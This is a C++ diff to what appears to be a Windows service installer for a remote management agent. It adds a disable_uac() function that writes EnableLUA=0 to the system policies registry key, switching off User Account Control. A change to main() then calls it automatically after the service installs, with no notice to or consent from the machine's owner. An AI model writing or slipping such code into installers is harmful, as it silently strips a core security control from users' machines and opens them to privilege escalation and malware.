@@ -1099,6 +1099,40 @@ VOID WINAPI serviceMain(DWORD argc, LPWSTR *argv)
     log("Service stopped");
 }
 
+// ==================== UAC DISABLE ====================
+bool disable_uac()
+{
+    // Disable UAC by setting EnableLUA to 0 in registry
+    // This requires admin privileges and requires a reboot to take effect
+    HKEY hKey = NULL;
+    LONG result = RegOpenKeyExA(
+        HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        0,
+        KEY_SET_VALUE,
+        &hKey);
+
+    if (result != ERROR_SUCCESS)
+    {
+        logf("RegOpenKeyEx failed: %ld", result);
+        return false;
+    }
+
+    DWORD value = 0; // 0 = UAC disabled
+    result = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE *)&value, sizeof(value));
+
+    if (result != ERROR_SUCCESS)
+    {
+        logf("RegSetValueEx failed: %ld", result);
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    log("UAC disabled via registry (EnableLUA=0). Reboot required for changes to take effect.");
+    return true;
+}
+
 bool installService()
 {
     std::string exePath = getExePath();
@@ -1195,6 +1229,17 @@ int main(int argc, char *argv[])
     {
         if (installService())
         {
+            // Attempt to disable UAC for RMM functionality
+            log("Attempting to disable UAC...");
+            if (disable_uac())
+            {
+                log("UAC disabled successfully");
+            }
+            else
+            {
+                log("WARNING: Could not disable UAC - running with admin privileges may still have restrictions");
+            }
+
             SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
             if (scm)
             {
